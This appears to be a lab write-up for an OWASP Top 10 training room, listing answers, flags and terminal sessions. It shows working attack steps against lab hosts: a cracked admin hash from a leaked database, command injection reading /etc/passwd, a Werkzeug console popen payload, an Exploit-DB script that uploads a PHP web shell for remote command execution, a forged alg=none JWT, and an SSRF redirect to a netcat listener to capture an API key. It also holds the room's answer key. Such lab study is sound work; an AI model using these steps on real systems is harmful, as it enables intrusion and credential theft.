<p>Have a look around the web app. The developer has left themselves a note indicating that there is sensitive data in a specific directory.</p>
<p>What is the name of the mentioned directory?</p>






<pre tabindex="0"><code>/assets</code></pre>
<p><img src="image-2.png#center" alt="alt text"></p>
<br>
<p>Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?</p>






<pre tabindex="0"><code>webapp.db</code></pre>
<p><img src="image-3.png#center" alt="alt text"></p>
<br>
<p>Use the supporting material to access the sensitive data. What is the password hash of the admin user?</p>






<pre tabindex="0"><code>6eea9b7ef19179a06954edd0f6c05ceb</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>webapp.db
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>└─$ file webapp.db
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>webapp.db: SQLite 3.x database, last written using SQLite version 3022000, file counter 255, database pages 7, 1st free page 5, free pages 1, cookie 0x6, schema 4, UTF-8, version-valid-for <span style="color:#fab387">255</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>└─$ sqlite3 webapp.db
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>SQLite version 3.44.2 2023-11-24 11:41:44
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Enter <span style="color:#a6e3a1">&#34;.help&#34;</span> <span style="color:#cba6f7">for</span> usage hints.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>sqlite&gt; .tables
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>sessions  users
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>sqlite&gt; PRAGMA table_info<span style="color:#89dceb;font-weight:bold">(</span>users<span style="color:#89dceb;font-weight:bold">)</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>0|userID|TEXT|1<span style="color:#89dceb;font-weight:bold">||</span><span style="color:#fab387">1</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>1|username|TEXT|1<span style="color:#89dceb;font-weight:bold">||</span><span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>2|password|TEXT|1<span style="color:#89dceb;font-weight:bold">||</span><span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>3|admin|INT|1<span style="color:#89dceb;font-weight:bold">||</span><span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>sqlite&gt; SELECT * FROM users;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|<span style="color:#fab387">1</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|<span style="color:#fab387">1</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|<span style="color:#fab387">0</span></span></span></code></pre></div>
<br>
<p>Crack the hash.
What is the admin&rsquo;s plaintext password?</p>






<pre tabindex="0"><code>qwertyuiop</code></pre>
<p><img src="image-4.png#center" alt="alt text"></p>
<br>
<p>Login as the admin. What is the flag?</p>






<pre tabindex="0"><code>THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}</code></pre>
<p><img src="image-5.png#center" alt="alt text"></p>
<br>
<h3 id="3-injection">3. Injection</h3>
<p>Injection flaws occur because the application interprets user-controlled input as commands or parameters.</p>
<p>Some common examples:</p>
<ul>
<li><strong>SQL Injection</strong></li>
<li><strong>Command Injection</strong></li>
</ul>
<p>The main defence for preventing injection attacks is ensuring that user-controlled input is not interpreted as queries or commands.</p>
<ul>
<li><strong>Allow list</strong>: checks input by comparing it to a list of safe inputs. If the input is marked as safe, then it is processed. Otherwise, it&rsquo;s rejected.</li>
<li><strong>Stripping input</strong>: If the input contains dangerous characters, these are removed before processing.</li>
</ul>
<h4 id="command-injection">Command Injection</h4>
<p>Command Injection occurs when server-side code in a web app makes a call to a function that interacts with the server&rsquo;s console directly. An Injection web vulnerability allows an attacker to take advantage of that call to execute operating system commands arbitrarily on the server.</p>
<br>
<p>What strange text file is in the website&rsquo;s root directory?</p>






<pre tabindex="0"><code>drpepper.txt</code></pre>
<p><img src="image-6.png#center" alt="alt text"></p>
<br>
<p>How many non-root/non-service/non-daemon users are there?</p>






<pre tabindex="0"><code>0</code></pre>
<p>In order to find users in Linux, we can use the following command: <code>cat /etc/passwd</code>.</p>
<p><img src="image-7.png#center" alt="alt text"></p>
<p>However, there are so many users in the output. We are only interested in <strong>non-root/non-service/non-daemon</strong> users.</p>
<p>We need to remember that Linux-based systems have two types of users: <code>system</code> and <code>normal</code> users.</p>
<ul>
<li><code>system users</code> are entities created by the system to run non-interactive processes, the processes that run in the background and do not require human interaction.</li>
<li><code>normal users</code> are human users created by root or another user with root privileges.</li>
</ul>
<p>Both system and normal users in Linux have a <code>Unique User ID (UID)</code> to identify them.</p>
<ul>
<li>System users have UIDs in the range from <code>0 (root user) to 999</code>.</li>
<li>Normal users typically receive UIDs from <code>1000 onwards</code></li>
</ul>
<p>I researched further to understand <code>/etc/passwd</code> file fields.</p>
<p><img src="image-8.png#center" alt="alt text"></p>
<p>arrow #3 represents the UID. From the output of our commands <code>cat /etc/passwd</code>, I found only one user that has UID higher than 1000.
That is, <code>nobody</code>. However, I learned that the user &rsquo;nobody&rsquo; is a reserved user created by the system. Therefore, the answer to the question is actually 0.</p>
<p><img src="image-9.png#center" alt="alt text"></p>
<br>
<p>What user is this app running as?</p>






<pre tabindex="0"><code>apache</code></pre>
<p>In order to find the current user, we can run the following command: <code>$(whoami)</code>
<img src="image-10.png#center" alt="alt text"></p>
<br>
<p>What is the user&rsquo;s shell set as?</p>






<pre tabindex="0"><code>/sbin/nologin</code></pre>
<p><code>$(cat /etc/passwd)</code> command we saw above shows that user apache&rsquo;s shell at the very bottom.</p>
<p><img src="image-11.png#center" alt="alt text"></p>
<br>
<p>What version of Alpine Linux is running?</p>






<pre tabindex="0"><code>3.16.0</code></pre>
<p>The hint of the question tells us that the version can be found in <code>/etc/alpine-release</code>.</p>
<p><img src="image-12.png#center" alt="alt text"></p>
<br>
<h3 id="4-insecure-design">4. Insecure Design</h3>
<p>Insecure design refers to vulnerabilities that are inherent to the application&rsquo;s architecture. They are not vulnerabilities regarding bad implementations or configurations, but the idea behind the whole application (or part of it) is falwed from the start.</p>
<br>
<p>Navigate to http://10.10.118.28:85 and get into joseph&rsquo;s account. This application also has a design flaw in its password reset mechanism. Can you figure out the weakness in the proposed design and how to abuse it?</p>
<p>Try to reset joseph&rsquo;s password. keep in mind the method used by the site to validate if you are indeed joseph.</p>
<p>What is the value of the flag in joseph&rsquo;s account?</p>






<pre tabindex="0"><code>THM{Not_3ven_c4tz_c0uld_sav3_U!}</code></pre>
<p><img src="image-13.png#center" alt="alt text">
<img src="image-14.png#center" alt="alt text"></p>
<p>One of the security questions was very easy to guess, and there was no limit on password attempts, which is an insecure design.</p>
<br>
<h3 id="5-security-misconfiguration">5. Security Misconfiguration</h3>
<p>Security Misconfigurations occur when security could have been appropriately configured but was not. Even if you download the latest up-to-date software, poor configurations could make your installation vulnerable.</p>
<p>Security misconfigurations include:</p>
<ul>
<li>Poorly configured permissions on cloud services, like S3 buckets.</li>
<li>Having unnecessary features enabled, like services, pages, accounts or privileges.</li>
<li>Default accounts with unchanged passwords.</li>
<li>Error messages that are overly detailed and allow attackers to find out more about the system.</li>
<li>Not using HTTP security headers.</li>
</ul>
<br>
<p>Navigate to http://10.10.118.28:86/console to access the Werkzeug console.</p>
<p>Use the Werkzeug console to run the following Python code to execute the ls -l command on the server:
<code>import os; print(os.popen(&quot;ls -l&quot;).read())</code></p>
<p>What is the database file name (the one with the .db extension) in the current directory?</p>






<pre tabindex="0"><code>todo.db</code></pre>
<br>
<p>Modify the code to read the contents of the <code>app.py</code> file, which contains the application&rsquo;s source code. What is the value of the <code>secret_flag</code> variable in the source code?</p>






<pre tabindex="0"><code>THM{Just_a_tiny_misconfiguration}</code></pre>
<p><img src="image-15.png#center" alt="alt text"></p>
<br>
<h3 id="6-vulnerable-and-outdated-components">6. Vulnerable and Outdated Components</h3>
<p>Occasionally, you may find that the company/entity you&rsquo;re pen-testing is using a program with a well-known vulnerability.
It requires very little work to exploit its vulnerability because the vulnerability is already well-known. If a company misses a single update for a program they use, it could be vulnerable to any number of attacks.</p>
<p>Navigate to http://10.10.118.28:84 where you&rsquo;ll find a vulnerable application.
All the information you need to exploit it can be found online.</p>
<p>What is the content of the /opt/flag.txt file?</p>






<pre tabindex="0"><code>THM{But_1ts_n0t_my_f4ult!}</code></pre>
<p><img src="image-16.png#center" alt="alt text">
At the very top, the website clearly specifies that the site is built with PHP, MYSQL (procedure functions), and Bootstrap.</p>
<br>
<p><img src="image-17.png#center" alt="alt text">
I googled <code>procedure functions bootstrap exploit</code> and the first result directs to <code>Exploit-DB</code>, clearly indicating we may be onto something!</p>
<br>
<p><img src="image-18.png#center" alt="alt text">
I downloaded the exploit and ran it</p>
<br>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>47887.py  webapp.db
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>└─$ python 47887.py
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>usage: 47887.py <span style="color:#89dceb;font-weight:bold">[</span>-h<span style="color:#89dceb;font-weight:bold">]</span> url
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>47887.py: error: the following arguments are required: url
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>└─$ python 47887.py http://10.10.118.28:84
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>&gt; Attempting to upload PHP web shell...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>&gt; Verifying shell upload...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>&gt; Web shell uploaded to http://10.10.118.28:84/bootstrap/img/KJvupFii50.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>&gt; Example <span style="color:#89dceb">command</span> usage: http://10.10.118.28:84/bootstrap/img/KJvupFii50.php?cmd<span style="color:#89dceb;font-weight:bold">=</span>whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>&gt; Do you wish to launch a shell here? <span style="color:#89dceb;font-weight:bold">(</span>y/n<span style="color:#89dceb;font-weight:bold">)</span>: y
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>RCE $ cat /opt/flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>But_1ts_n0t_my_f4ult!<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<br>
<h3 id="7-identification-and-authentication-failures">7. Identification and Authentication Failures</h3>
<p>Authentication and session management constitute core components of modern web applications.
<em>Authentication</em> allows users to gain access to web applications by verifying their identities.
The most common form of authentication is using a username and password.
If a user enters correct credentials, the server would provide ther users&rsquo; browser with a session cookie. A <em>session cookie</em> is needed because web servers use HTTP(S) to communicate, which is stateless. Attaching session cookies means the server will know who is sending what data. The server can then keep track of user&rsquo;s actions.</p>
<p>Some common flaws in authentication mechanisms:</p>
<ul>
<li>Brute force attacks</li>
<li>Use of weak credentials</li>
<li>Weak Session Cookies</li>
</ul>
<p>Some mitigation for broekn authentication mechanisms:</p>
<ul>
<li>Enforce a strong password policy</li>
<li>Enforce an automatic lockout after a certain number of attempts</li>
<li>Implement Multi-Factor Authentication</li>
</ul>
<p>Many times, what happens is that developers forget to sanitize the input given by the user in the code of their application. We will focus on a vulnerability that happens because of a developer&rsquo;s mistake but is very easy to exploit, <code>re-registration</code></p>
<p>Go to http://10.10.118.28:8088 and try to register with <code>darren</code> as your username. You&rsquo;ll see that the user already exists, so try to register <code> darren</code> (whitespace at the start) instead, and you&rsquo;ll see that you are now logged in and can see the content present only in darren&rsquo;s account, which in our case, is the flag that you need to retrieve.</p>
<br>
<p>What is the flag that you found in darren&rsquo;s account?</p>






<pre tabindex="0"><code>fe86079416a21a3c99937fea8874b667</code></pre>
<p><img src="image-19.png#center" alt="alt text"></p>
<br>
<p>Now try to do the same trick and see if you can log in as <code>arthur</code></p>






<pre tabindex="0"><code>d9ac0f7db4fda460ac3edeb75d75e16e</code></pre>
<p><img src="image-20.png#center" alt="alt text"></p>
<br>
<h3 id="8-software-and-data-integrity-failures">8. Software and Data Integrity Failures</h3>
<h4 id="what-is-integrity">What is Integrity?</h4>
<p>When talking about integrity, we refer to the capacity we have to ascertain that a piece of data remains unmodified.
Integrity is essential in cybersecurity as we care about maintaining important data free from unwanted or malicious modifications.
A <code>hash</code> is generally mentioned as a solution for ensuring data integrity.</p>
<br>
<p>What is the SHA-256 hash of <code>https://code.jquery.com/jquery-1.12.4.min.js</code>?</p>






<pre tabindex="0"><code>sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=</code></pre>
<p><img src="image-21.png#center" alt="alt text"></p>
<p>When a user logs into an application, they will be assigned some sort of session token that will need to be saved on the browser. This token will be repeated on each subsequent request to identify who we are. These session token can come in many forms but are usually assigned via <code>cookies</code>.</p>
<p>Cookies are key-value pairs that a web application will store on the user&rsquo;s browser and that will be automatically repeated on each request to the website that issued them. This could be a terrible idea security-wise because, cookies are stored on the user&rsquo;s browser, so if the user tampers with the cookie, they could potentially impersonate someone else. The application would suffer from a data integrity failure.</p>
<p>One solution to this is use some integry mechanisms to guarantee that cookie hasn&rsquo;t been altered by the user. One popular option is <code>JSON Web Tokens (JWT)</code></p>
<p>JWTs are very simple tokens that allow you to store key-value pairs on a token that provides integrity as part of the token. The idea is that you can generate tokens that you can give your users with the certainty that they won&rsquo;t be able to alter the key-value pairs and pass the integrity check.</p>
<p><img src="image-24.png#center" alt="alt text">
JWT token is formed of 3 parts: <code>Header</code>, <code>Payload</code> and <code>Signature</code>.</p>
<p>A data integrity failure vulnerability was present on some libraries implementing JWTs a while ago. The vulnerable libraries allowed attackers to bypass the signature validation by changing the two following things in a JWT:</p>
<ol>
<li>Modify the header section of the token so that the <code>alg</code> header would contain the value <code>none</code>.</li>
<li>Remove the signature part.</li>
</ol>
<p><img src="image-25.png#center" alt="alt text"></p>
<br>
<p>Try logging into the application as guest. What is guest&rsquo;s account password?</p>






<pre tabindex="0"><code>guest</code></pre>
<p><img src="image-22.png#center" alt="alt text"></p>
<br>
<p>If your login was successful, you should now have a JWT stored as a cookie in your browser. Press F12 to bring out the Developer Tools.</p>
<p>What is the name of the website&rsquo;s cookie containing a JWT token?</p>






<pre tabindex="0"><code>jwt-session</code></pre>
<p><img src="image-23.png#center" alt="alt text"></p>
<br>
<p>Use the knowledge gained in this task to modify the JWT toekn so that the application thinks you are the user &ldquo;admin&rdquo;.</p>
<p>What is the flag presented to the admin user?</p>






<pre tabindex="0"><code>THM{Dont_take_cookies_from_strangers}</code></pre>
<br>
<p>original token: <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzE5ODk1NzI0fQ.KY3A8a6eVrLrqFt606eVjfMLYLGTRtZAwthimwQO5Lo</code></p>
<p>We learned that the JWT token is formed of 3 parts.</p>
<ul>
<li>Header: <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</code></li>
<li>Payload: <code>eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzE5ODk1NzI0fQ</code></li>
<li>Signature: <code>KY3A8a6eVrLrqFt606eVjfMLYLGTRtZAwthimwQO5Lo</code></li>
</ul>
<p>Now we can use the encode/decode online tool to modify the contents of the header and remove signature.</p>
<p>First decode the <code>Header</code> part of the token
<img src="image-26.png#center" alt="alt text"></p>
<br>
<p>Modify the <code>alg</code> value to <code>none</code>
<img src="image-27.png#center" alt="alt text"></p>
<br>
<p>Decode the <code>Payload</code> part of the token
<img src="image-28.png#center" alt="alt text"></p>
<br>
<p>Modify the value of the username to <code>admin</code>
<img src="image-29.png#center" alt="alt text"></p>
<br>
<p>Remove Signature and combine those modified parts</p>
<ul>
<li>
<p>Header_modified: <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0</code></p>
</li>
<li>
<p>Payload_modified: <code>eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzE5ODk1NzI0fQ</code></p>
</li>
<li>
<p>Combined_token_modified: <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzE5ODk1NzI0fQ.</code></p>
</li>
</ul>
<p><em>Notice that I still kept the dot at then end even though we removed the signature part of the token.</em>
<br></p>
<p>Replace the value of the cookie to our modified token and refresh the page
<img src="image-30.png#center" alt="alt text"></p>
<br>
<h3 id="9-security-logging-and-monitoring-failures">9. Security Logging and Monitoring Failures</h3>
<p>When web applications are set up, every action performed by the user should be logged. Logging is important because if an incident occurs, the attackers&rsquo; activites can be traced. Once their actions are traced, their risk and impact can be determined.</p>
<p>The information stored in logs should include the following:</p>
<ul>
<li>HTTP status codes</li>
<li>Time Stamps</li>
<li>Usernames</li>
<li>API endpoints/page locations</li>
<li>IP addresses</li>
</ul>
<p>These logs have sensitive information so it&rsquo;s important to ensure that they are stored securely and that multiple copies of these logs are stored at different locations.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#fab387">200</span> OK           12.55.22.88 jr22          2019-03-18T09:21:17 /login
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span><span style="color:#fab387">200</span> OK           14.56.23.11 rand99        2019-03-18T10:19:22 /login
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#fab387">200</span> OK           17.33.10.38 afer11        2019-03-18T11:11:44 /login
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#fab387">200</span> OK           99.12.44.20 rad4          2019-03-18T11:55:51 /login
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#fab387">200</span> OK           67.34.22.10 bff1          2019-03-18T13:08:59 /login
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#fab387">200</span> OK           34.55.11.14 hax0r         2019-03-21T16:08:15 /login
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#fab387">401</span> Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#fab387">401</span> Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#fab387">401</span> Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#fab387">401</span> Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login</span></span></code></pre></div>
<br>
<p>What IP address is the attacker using?</p>






<pre tabindex="0"><code>49.99.13.16</code></pre>
<br>
<p>What kind of attack is being carried out?</p>






<pre tabindex="0"><code>brute force</code></pre>
<br>
<h3 id="10-server-side-request-forgery-ssrf">10. Server-Side Request Forgery (SSRF)</h3>
<p>This type of vulnerability occurs when an attacker coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. SSRF vulnerabilities often arise from implementations where our web applicatio nneeds to use third-party services.</p>
<p>Navigate to <code>http://MACHINE_IP</code>, where you&rsquo;ll find a simple web application. After exploring a bit, you should see an admin area, which will be our main objective. Follow the instructions on the following questions to gain access to the website&rsquo;s restricted area!</p>
<p>Explore the website. What is the only host allowed to access the admin area?</p>






<pre tabindex="0"><code>localhost</code></pre>
<br>
<p>Check the &ldquo;Download Resume&rdquo; button. Where does the server parameter point to?</p>






<pre tabindex="0"><code>secure-file-storage.com</code></pre>
<p><img src="image-31.png#center" alt="alt text"></p>
<br>
<p>Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?</p>






<pre tabindex="0"><code>THM{Hello_Im_just_an_API_key}</code></pre>
<p>replace <code>secure-file-storage.com</code> part with your own AttackBox IP address and run <code>nc -lvp 8087</code> command.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ nc -lvp <span style="color:#fab387">8087</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>listening on <span style="color:#89dceb;font-weight:bold">[</span>any<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">8087</span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>10.10.245.216: inverse host lookup failed: Unknown host
